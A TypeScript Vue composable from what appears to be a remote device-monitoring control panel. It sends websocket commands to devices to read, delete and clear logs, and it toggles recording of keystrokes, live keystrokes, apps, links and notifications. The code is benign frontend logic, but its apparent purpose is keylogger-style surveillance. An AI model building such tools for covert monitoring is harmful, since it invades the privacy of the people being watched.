import { ref, type Ref } from 'vue';
import type { WebSocketOutboundMessage } from '@/types/websocket';
import type { LogType, LogOptions, DeviceLogEntry } from '@/types/device';
import axios from 'axios';

type SendFunction = (message: WebSocketOutboundMessage) => boolean;

const REQUEST_TIMEOUT = 8000;

export function useDeviceLogs(
    send: SendFunction,
    deviceId: Ref<string>,
    deviceUuid: Ref<string>,
) {
    const loading = ref(false);
    const logFiles = ref<Record<string, string>>({});
    const logContent = ref('');
    const logOptions = ref<LogOptions>({
        recKeystrokes: true,
        liveKeystrokes: false,
        recApps: true,
        recLinks: true,
        recNotifications: true,
    });
    const historicalLogs = ref<DeviceLogEntry[]>([]);
    const historicalTotal = ref(0);
    const historicalLoading = ref(false);

    const sendCommand = (command: string, params: Record<string, unknown> = {}): boolean => {
        return send({
            command,
            params,
            pid: deviceId.value,
        });
    };

    const withTimeout = (fn: () => boolean) => {
        loading.value = true;
        setTimeout(() => { if (loading.value) loading.value = false; }, REQUEST_TIMEOUT);
        return fn();
    };

    const getLogList = (type: LogType) => withTimeout(() => sendCommand('GET_LOG_LIST', { type }));

    const getAllLogLists = () => withTimeout(() => sendCommand('GET_ALL_LOG_LISTS'));

    const readLog = (type: LogType, filename: string) => withTimeout(() => sendCommand('READ_LOG', { type, filename }));

    const deleteLog = (type: LogType, filename: string) => sendCommand('DELETE_LOG', { type, filename });

    const clearLogs = (type: LogType) => sendCommand('CLEAR_LOGS', { type });

    const clearAllLogs = () => sendCommand('CLEAR_ALL_LOGS');

    const setLogOptions = (options: Partial<LogOptions>) => sendCommand('SET_LOG_OPTIONS', options);

    const getLogOptions = () => withTimeout(() => sendCommand('GET_LOG_OPTIONS'));

    const fetchHistoricalLogs = async (params: {
        log_type?: LogType;
        start_time?: string;
        end_time?: string;
        per_page?: number;
        page?: number;
    } = {}) => {
        historicalLoading.value = true;
        try {
            const response = await axios.get(`/devices/${deviceUuid.value}/logs`, {
                params,
            });
            if (response.data?.success) {
                const paginated = response.data.data;
                historicalLogs.value = paginated.data ?? [];
                historicalTotal.value = paginated.total ?? 0;
            }
        } catch {
            historicalLogs.value = [];
            historicalTotal.value = 0;
        } finally {
            historicalLoading.value = false;
        }
    };

    const handleLogCommandResult = (data: Record<string, unknown>) => {
        loading.value = false;

        if (data.options) {
            logOptions.value = data.options as LogOptions;
        }
        if (data.lists) {
            logFiles.value = data.lists as Record<string, string>;
        } else if (data.type && data.files !== undefined) {
            logFiles.value = {
                ...logFiles.value,
                [data.type as string]: data.files as string,
            };
        }
        if (data.content !== undefined) {
            logContent.value = data.content as string;
        }
    };

    return {
        loading,
        logFiles,
        logContent,
        logOptions,
        historicalLogs,
        historicalTotal,
        historicalLoading,
        getLogList,
        getAllLogLists,
        readLog,
        deleteLog,
        clearLogs,
        clearAllLogs,
        setLogOptions,
        getLogOptions,
        fetchHistoricalLogs,
        handleLogCommandResult,
    };
}
